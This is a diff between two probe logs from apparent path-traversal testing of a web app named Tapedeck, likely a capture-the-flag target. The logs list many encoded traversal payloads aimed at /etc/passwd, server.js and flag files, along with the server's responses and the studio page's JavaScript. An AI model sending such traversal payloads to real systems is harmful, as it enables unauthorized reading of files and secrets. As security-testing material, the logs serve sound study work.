@@ -1,101 +1,75 @@
-studio 200 cookie: td_session=s%3AIc0veIaY6t6eieBM6EYXSlJTNej09bBF.IZUpY2xHQMMD8J7AZfDB96fKPTttmksg4H0Z2qEZ1ww; Path=/; HttpOnly; SameSite=Lax
-workspace: a90a67
+render: {'ok': True, 'outputs': [{'file': 'audiogram.png', 'url': '/m/0da02de760fc46ed/audiogram.png'}], 'errors': None}
+poster url: /m/0da02de760fc46ed/audiogram.png ws: 0da02de760fc46ed
+GET poster: 200 image/png len 8545
 
-=== UPLOAD 200 ===
-headers: {"Content-Type": "text/html; charset=utf-8"}
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Studio — Tapedeck</title>
-  <link rel="stylesheet" href="/public/css/site.css">
-  <link rel="icon" href="data:,">
-</head>
-<body>
-  <header class="nav">
-    <div class="wrap nav-inner">
-      <a class="brand" href="/">
-        <span class="brand-mark"></span>
-        <span class="brand-word">Tapedeck</span>
-      </a>
-      <nav class="nav-links">
-        <a href="/features" class="">Features</a>
-        <a href="/pricing"  class="">Pricing</a>
-        <a href="/about"    class="">About</a>
-      </nav>
-      <div class="nav-cta">
-        <a class="btn btn-ghost" href="/studio">Sign in</a>
-        <a class="btn btn-solid" href="/studio">Open Studio</a>
-      </div>
-    </div>
-  </header>
-  <main>
+########## SERVE-ROUTE TRAVERSAL (LFI) ##########
+[/m/0da02de760fc46ed/../../../../etc/passwd] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
+[/m/0da02de760fc46ed/..%2f..%2f..%2f..%2fetc%2fpasswd] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
+[/m/0da02de760fc46ed/..%2F..%2F..%2F..%2Fetc%2Fpasswd] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
+[/m/0da02de760fc46ed/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
+[/m/0da02de760fc46ed/..%252f..%252f..%252fetc%252fpasswd] 404 ct=text/html; charset=utf-8 len=3274 bin b'<!doctype html>\n<html lang="en">\n<head>\n'
+[/m/0da02de760fc46ed/....//....//....//....//etc/passwd] 404 ct=text/html; charset=utf-8 len=3274 bin b'<!doctype html>\n<html lang="en">\n<head>\n'
+[/m/0da02de760fc46ed%2f..%2f..%2f..%2fetc%2fpasswd] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
+[/m/../etc/passwd] 404 ct=text/html; charset=utf-8 len=3274 bin b'<!doctype html>\n<html lang="en">\n<head>\n'
+[/m/..%2f..%2f..%2fetc%2fpasswd] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
+[/m/0da02de760fc46ed/../../../../etc/passwd%00.png] 400 ct=text/html len=155 TEXT: b'<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n'
+[/m/0da02de760fc46ed/..\..\..\..\etc\passwd] 404 ct=text/html; charset=utf-8 len=3274 bin b'<!doctype html>\n<html lang="en">\n<head>\n'
 
+########## try reading app source & flag via serve route ##########
 
-<section class="studio">
-  <div class="wrap">
-    <div class="studio-head">
-      <div>
-        <span class="eyebrow">Clip Studio</span>
-        <h1>Turn a clip into an audiogram</h1>
-        <p>Upload a short piece of audio and Tapedeck renders a shareable waveform poster. Name your export, pick a look, and download it for social.</p>
-      </div>
-      <div class="studio-ws">Workspace <span class="mono">a90a67</span></div>
-    </div>
+########## full studio inline JS ##########
+<script>
+  (function () {
+    var form = document.getElementById('renderForm');
+    if (!form) return;
+    var btn = document.getElementById('renderBtn');
+    var status = document.getElementById('renderStatus');
+    var grid = document.getElementById('posterGrid');
+    var empty = document.getElementById('postersEmpty');
 
-    <div class="alert alert-ok">Clip uploaded. Name your audiogram and render it.</div>
+    function addPoster(o) {
+      if (grid.querySelector('[data-file="' + (window.CSS && CSS.escape ? CSS.escape(o.file) : o.file) + '"]')) return;
+      var a = document.createElement('a');
+      a.className = 'poster';
+      a.setAttribute('data-file', o.file);
+      a.href = o.url; a.target = '_blank'; a.rel = 'noopener';
+      var img = document.createElement('img');
+      img.src = o.url; img.alt = 'Audiogram ' + o.file;
+      var name = document.createElement('span');
+      name.className = 'poster-name mono'; name.textContent = o.file;
+      a.appendChild(img); a.appendChild(name);
+      grid.insertBefore(a, grid.firstChild);
+    }
 
-    <div class="studio-grid">
-      <div class="panel">
-        <h2>1. Upload a clip</h2>
-        <p class="sub">MP3, WAV, or M4A. Up to 12 MB, we use the first 20 seconds.</p>
-        <form method="post" action="/studio/upload" enctype="multipart/form-data" class="uploader">
-          <input type="file" name="clip" accept="audio/*" required>
-          <button class="btn btn-solid" type="submit">Upload clip</button>
-        </form>
-        
-          <div class="clip-chip"><span class="dot"></span> <span class="mono">clip.wav</span> &middot; 0.0 MB</div>
-        
-      </div>
-
-      <div class="panel">
-        
-
-=== RENDER normal 200 ===
-{"ok":true,"outputs":[{"file":"audiogram.png","url":"/m/a90a67f0586ae2c6/audiogram.png"}],"errors":null}
-PARSED: {'ok': True, 'outputs': [{'file': 'audiogram.png', 'url': '/m/a90a67f0586ae2c6/audiogram.png'}], 'errors': None}
-
-=== TRAVERSAL SLUG PROBES ===
-
--- slug='../../../../etc/passwd' -> 200
-{"ok":false,"outputs":[],"errors":"ffmpeg exited with code 1\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshin
-
--- slug='..%2f..%2f..%2fetc%2fpasswd' -> 200
-{"ok":true,"outputs":[{"file":"..%2f..%2f..%2fetc%2fpasswd.png","url":"/m/a90a67f0586ae2c6/..%2f..%2f..%2fetc%2fpasswd.png"}],"errors":null}
-
--- slug='/etc/passwd' -> 200
-{"ok":false,"outputs":[],"errors":"ffmpeg exited with code 1\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshin
-
--- slug='....//....//....//etc/passwd' -> 200
-{"ok":false,"outputs":[],"errors":"ffmpeg exited with code 1\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshin
-
--- slug='../../server.js' -> 200
-{"ok":false,"outputs":[],"errors":"ffmpeg exited with code 0\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshin
-
--- slug='../../../app/flag.txt' -> 200
-{"ok":false,"outputs":[],"errors":"ffmpeg exited with code 0\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshin
-
--- slug='../../flag' -> 200
-{"ok":false,"outputs":[],"errors":"ffmpeg exited with code 0\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshin
-
--- slug='test/../../../etc/passwd' -> 200
-{"ok":false,"outputs":[],"errors":"ffmpeg exited with code 1\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshin
-
--- slug='..\\..\\..\\etc\\passwd' -> 200
-{"ok":true,"outputs":[{"file":"..\\..\\..\\etc\\passwd.png","url":"/m/a90a67f0586ae2c6/..\\..\\..\\etc\\passwd.png"}],"errors":null}
-
--- slug='%2e%2e/%2e%2e/etc/passwd' -> 200
-{"ok":false,"outputs":[],"errors":"ffmpeg exited with code 1\nffmpeg version 5.1.9-0+deb12u1 Copyright (c) 2000-2026 the FFmpeg developers\n  built with gcc 12 (Debian 12.2.0-14+deb12u1)\n  configuration: --prefix=/usr --extra-version=0+deb12u1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libglslang --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librist --enable-librubberband --enable-libshin
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      btn.disabled = true;
+      status.textContent = 'Rendering...';
+      fetch('/api/render', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          slug: document.getElementById('slugInput').value,
+          theme: document.getElementById('themeSelect').value
+        })
+      })
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+          // Note: the API also returns an `errors` field on failure. The Studio
+          // does not surface it here.
+          var outs = (data && data.outputs) || [];
+          if (outs.length) {
+            empty.hidden = true; grid.hidden = false;
+            outs.forEach(addPoster);
+            status.textContent = 'Rendered.';
+          } else {
+            status.textContent = 'Nothing to render.';
+          }
+        })
+        .catch(function () { status.textContent = 'Nothing to render.'; })
+        .then(function () { btn.disabled = false; });
+    });
+  })();
+</script>
 
 DONE
